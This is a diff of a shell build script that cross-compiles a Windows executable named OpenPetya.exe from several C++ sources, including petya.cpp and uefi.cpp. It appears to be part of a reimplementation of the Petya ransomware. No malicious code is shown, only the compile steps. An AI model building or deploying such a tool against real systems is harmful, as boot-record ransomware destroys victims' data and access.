@@ -1,4 +1,13 @@
 echo "[*] Compiling..."
 rm ./main/OpenPetya.exe
-x86_64-w64-mingw32-g++ -o ./main/OpenPetya.exe ./main/OpenPetya.cpp -lsetupapi -static
+
+x86_64-w64-mingw32-g++ \
+    ./main/OpenPetya.cpp \
+    ./main/petya.cpp \
+    ./main/utils.cpp \
+    ./main/uefi.cpp \
+    -o ./main/OpenPetya.exe \
+    -lsetupapi \
+    -static
+
 echo "[+] OK"
